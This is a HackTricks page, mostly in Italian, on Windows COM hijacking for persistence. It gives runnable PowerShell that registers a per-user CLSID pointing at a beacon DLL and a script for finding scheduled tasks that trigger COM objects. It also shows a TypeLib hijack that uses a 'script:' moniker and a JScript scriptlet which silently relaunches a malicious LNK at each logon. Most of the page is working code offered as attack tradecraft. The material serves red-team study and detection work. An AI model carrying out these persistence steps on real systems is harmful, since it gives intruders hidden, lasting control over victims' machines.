# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Ricerca di componenti COM inesistenti

Poiché i valori di HKCU possono essere modificati dagli utenti **COM Hijacking** potrebbe essere usato come **meccanismi persistenti**. Usando `procmon` è facile trovare voci di registro COM cercate che non esistono e che un attaccante potrebbe creare per ottenere persistenza. Filtri:

- operazioni **RegOpenKey**.
- dove il _Result_ è **NAME NOT FOUND**.
- e il _Path_ termina con **InprocServer32**.

Una volta deciso quale COM inesistente impersonare, esegui i seguenti comandi. _Fai attenzione se decidi di impersonare un COM che viene caricato ogni pochi secondi in quanto potrebbe essere eccessivo._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Componenti COM hijackable del Task Scheduler

Le Windows Tasks usano Custom Triggers per chiamare COM objects e, poiché vengono eseguite tramite il Task Scheduler, è più facile prevedere quando verranno attivate.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Verificando l'output puoi selezionarne una che verrà eseguita, ad esempio, **ogni volta che un utente effettua l'accesso**.

Ora cercando il CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\CLASSES\ROOT\CLSID** e in HKLM e HKCU, di solito scoprirai che il valore non esiste in HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Then, puoi semplicemente creare la voce HKCU e ogni volta che l'utente effettua il login, il tuo backdoor verrà eseguito.

---

## COM TypeLib Hijacking (script: moniker persistence)

Le Type Libraries (TypeLib) definiscono le interfacce COM e vengono caricate tramite `LoadTypeLib()`. Quando un COM server viene istanziato, il sistema operativo può anche caricare la TypeLib associata consultando le chiavi di registro sotto `HKCR\TypeLib\{LIBID}`. Se il percorso della TypeLib viene sostituito con un **moniker**, ad esempio `script:C:\...\evil.sct`, Windows eseguirà lo scriptlet quando la TypeLib viene risolta — generando una persistència stealth che si attiva quando componenti comuni vengono toccati.

Questo è stato osservato contro il Microsoft Web Browser control (frequently loaded by Internet Explorer, apps embedding WebBrowser, and even `explorer.exe`).

### Steps (PowerShell)

1) Identify the TypeLib (LIBID) used by a high-frequency CLSID. Example CLSID often abused by malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Indirizzare il percorso TypeLib per utente a uno scriptlet locale usando il moniker `script:` (non sono necessari privilegi di amministratore):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop un JScript `.sct` minimale che rilancia il tuo primary payload (ad es. un `.lnk` usato dalla initial chain):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Attivazione – l'apertura di IE, un'applicazione che incorpora il WebBrowser control, o anche la normale attività di Explorer caricherà la TypeLib ed eseguirà lo scriptlet, riarmando la catena all'accesso/riavvio.

Pulizia
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Note
- Puoi applicare la stessa logica ad altri componenti COM ad alta frequenza; risolvi sempre prima il vero `LIBID` da `HKCR\CLSID\{CLSID}\TypeLib`.
- Su sistemi a 64-bit puoi anche popolare la sottochiave `win64` per i client a 64-bit.

## Riferimenti

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
